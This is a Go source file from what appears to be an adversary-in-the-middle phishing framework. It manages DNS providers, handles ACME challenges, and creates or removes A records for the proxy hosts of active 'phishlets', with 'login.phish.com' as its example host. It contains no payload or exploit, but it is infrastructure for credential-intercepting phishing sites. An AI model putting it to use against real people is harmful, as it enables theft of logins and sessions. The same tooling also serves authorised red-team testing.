package aitm

import (
	"context"
	"errors"
	"fmt"
	"log/slog"
	"strings"
	"sync"

	"github.com/travisbale/mirage/sdk"
)

var ErrRecordExists = errors.New("dns: record already exists")
var ErrRecordNotFound = errors.New("dns: record not found")

// DNSProvider is the interface that dns provider implementations satisfy implicitly.
// It covers record management, ACME DNS-01 challenge support, and health checking.
// Implementations must be safe for concurrent use.
type DNSProvider interface {
	CreateRecord(ctx context.Context, zone, name, typ, value string, ttl int) error
	UpdateRecord(ctx context.Context, zone, name, typ, value string, ttl int) error
	DeleteRecord(ctx context.Context, zone, name, typ string) error

	// ACME DNS-01 challenge support.
	Present(ctx context.Context, domain, token, keyAuth string) error
	CleanUp(ctx context.Context, domain, token, keyAuth string) error

	Ping(ctx context.Context) error

	// Name returns a short provider identifier, e.g. "builtin" or "cloudflare".
	Name() string
}

// ZoneConfig pairs a zone (base domain) with its provider alias and the
// external IP to use for A records.
type ZoneConfig struct {
	Zone         string
	ProviderName string
	ExternalIP   string
}

// PhishletRecord is the set of DNS records that must exist for one proxy host
// inside an active phishlet.
type PhishletRecord struct {
	Zone string
	Name string // FQDN, e.g. "login.phish.com"
	IP   string // overrides ZoneConfig.ExternalIP when non-empty
}

// NopDNSReconciler is a DNS reconciler that does nothing. Used when no DNS
// providers are configured (e.g., local testing with /etc/hosts).
type NopDNSReconciler struct{}

func (NopDNSReconciler) Reconcile(_ context.Context, _ []PhishletRecord) error     { return nil }
func (NopDNSReconciler) RemoveRecords(_ context.Context, _ []PhishletRecord) error { return nil }

// DNSService routes DNS record operations to the appropriate provider for each
// configured zone, and reconciles the desired record state for active phishlets.
type DNSService struct {
	mu        sync.RWMutex
	providers map[string]DNSProvider // key: provider alias
	zones     map[string]ZoneConfig  // key: zone (base domain)
	bus       eventBus
	logger    *slog.Logger
}

func NewDNSService(providers map[string]DNSProvider, zones map[string]ZoneConfig, bus eventBus, logger *slog.Logger) *DNSService {
	return &DNSService{
		providers: providers,
		zones:     zones,
		bus:       bus,
		logger:    logger,
	}
}

// ListZones returns all configured DNS zones.
func (s *DNSService) ListZones() []ZoneConfig {
	s.mu.RLock()
	defer s.mu.RUnlock()

	zones := make([]ZoneConfig, 0, len(s.zones))
	for _, zc := range s.zones {
		zones = append(zones, zc)
	}
	return zones
}

// ListProviders returns the aliases of all configured DNS providers.
func (s *DNSService) ListProviders() []string {
	s.mu.RLock()
	defer s.mu.RUnlock()

	names := make([]string, 0, len(s.providers))
	for alias := range s.providers {
		names = append(names, alias)
	}
	return names
}

func (s *DNSService) providerFor(zone string) (DNSProvider, ZoneConfig, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	zoneConfig, ok := s.zones[zone]
	if !ok {
		return nil, ZoneConfig{}, fmt.Errorf("dns: no provider configured for zone %q", zone)
	}

	dnsProvider, ok := s.providers[zoneConfig.ProviderName]
	if !ok {
		return nil, ZoneConfig{}, fmt.Errorf("dns: provider alias %q not found", zoneConfig.ProviderName)
	}

	return dnsProvider, zoneConfig, nil
}

// zoneForDomain finds the longest matching configured zone for a given FQDN.
func (s *DNSService) zoneForDomain(fqdn string) string {
	s.mu.RLock()
	defer s.mu.RUnlock()

	best := ""
	for zone := range s.zones {
		if strings.HasSuffix(fqdn, "."+zone) || fqdn == zone {
			if len(zone) > len(best) {
				best = zone
			}
		}
	}

	return best
}

func (s *DNSService) CreateRecord(ctx context.Context, zone, name, typ, value string, ttl int) error {
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}
	return provider.CreateRecord(ctx, zone, name, typ, value, ttl)
}

func (s *DNSService) UpdateRecord(ctx context.Context, zone, name, typ, value string, ttl int) error {
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}
	return provider.UpdateRecord(ctx, zone, name, typ, value, ttl)
}

func (s *DNSService) DeleteRecord(ctx context.Context, zone, name, typ string) error {
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}
	return provider.DeleteRecord(ctx, zone, name, typ)
}

func (s *DNSService) Present(ctx context.Context, domain, token, keyAuth string) error {
	zone := s.zoneForDomain(domain)
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}
	return provider.Present(ctx, domain, token, keyAuth)
}

func (s *DNSService) CleanUp(ctx context.Context, domain, token, keyAuth string) error {
	zone := s.zoneForDomain(domain)
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}
	return provider.CleanUp(ctx, domain, token, keyAuth)
}

// Reconcile creates or updates DNS records to match the desired state.
// It is idempotent — calling it twice with the same desired state is safe.
func (s *DNSService) Reconcile(ctx context.Context, desiredRecords []PhishletRecord) error {
	var errs []error
	for _, record := range desiredRecords {
		provider, zoneConfig, err := s.providerFor(record.Zone)
		if err != nil {
			errs = append(errs, err)
			continue
		}

		ip := record.IP
		if ip == "" {
			ip = zoneConfig.ExternalIP
		}

		if err := provider.CreateRecord(ctx, record.Zone, record.Name, "A", ip, 300); err != nil {
			if errors.Is(err, ErrRecordExists) {
				if updateErr := provider.UpdateRecord(ctx, record.Zone, record.Name, "A", ip, 300); updateErr != nil {
					errs = append(errs, updateErr)
					continue
				}
			} else {
				errs = append(errs, err)
				continue
			}
		}

		s.logger.Info("dns record ensured",
			"zone", record.Zone,
			"name", record.Name,
			"ip", ip,
			"provider", provider.Name(),
		)
	}

	if len(errs) > 0 {
		return errors.Join(errs...)
	}
	s.bus.Publish(Event{
		Type:    sdk.EventDNSRecordSynced,
		Payload: desiredRecords,
	})

	return nil
}

// RemoveRecords cleans up DNS records when a phishlet is disabled.
func (s *DNSService) RemoveRecords(ctx context.Context, records []PhishletRecord) error {
	var errs []error
	for _, record := range records {
		provider, _, err := s.providerFor(record.Zone)
		if err != nil {
			errs = append(errs, err)
			continue
		}

		if err := provider.DeleteRecord(ctx, record.Zone, record.Name, "A"); err != nil {
			errs = append(errs, err)
			continue
		}

		s.logger.Info("dns record removed",
			"zone", record.Zone,
			"name", record.Name,
			"provider", provider.Name(),
		)
	}

	return errors.Join(errs...)
}
